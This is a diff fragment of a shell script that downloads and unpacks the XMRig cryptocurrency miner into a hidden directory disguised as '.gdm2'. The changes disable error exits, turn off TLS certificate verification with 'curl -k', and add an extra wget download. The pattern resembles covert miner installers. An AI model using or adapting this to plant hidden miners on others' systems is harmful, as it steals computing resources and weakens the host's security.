@@ -170,7 +170,7 @@ echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
 if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
-  exit 1
+#  exit 1
 fi
 rm xmrig.tar.gz
 
@@ -189,10 +189,12 @@ if (test $? -ne 0); then
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
-  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
+  if ! curl -k -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
-    exit 1
+ #   exit 1
   fi
+  
+  wget https://github.com/xmrig/xmrig/releases/latest
 
   echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
   if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
